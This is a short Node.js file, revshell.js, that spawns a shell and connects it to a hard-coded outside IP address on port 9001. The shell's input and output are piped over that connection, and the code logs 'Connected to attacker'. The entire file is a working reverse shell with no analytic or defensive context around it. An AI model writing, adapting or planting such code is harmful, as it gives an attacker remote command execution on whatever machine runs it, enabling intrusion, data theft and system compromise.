// revshell.js
const net = require('net');
const sh = require('child_process').spawn('/bin/sh');

const client = new net.Socket();
client.connect(9001, '86.178.225.29', () => {
  console.log('Connected to attacker');
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
